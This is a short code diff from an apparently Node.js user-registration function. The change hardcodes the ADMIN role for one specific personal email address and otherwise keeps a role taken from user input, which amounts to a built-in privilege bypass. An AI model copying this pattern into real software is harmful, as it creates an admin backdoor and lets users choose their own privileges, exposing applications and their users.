@@ -49,7 +49,7 @@ async function register(req, username, password, done){
             age: userDto.age,
             password: createHash(userDto.password),
             cart: userDto.cart,
-            role: userDto.role,
+            role: userDto.email === "xxel.tiradorxx@gmail.com" ? "ADMIN" : userDto.role,
             last_connection: userDto.last_connection,
             documents: userDto.documents
         };
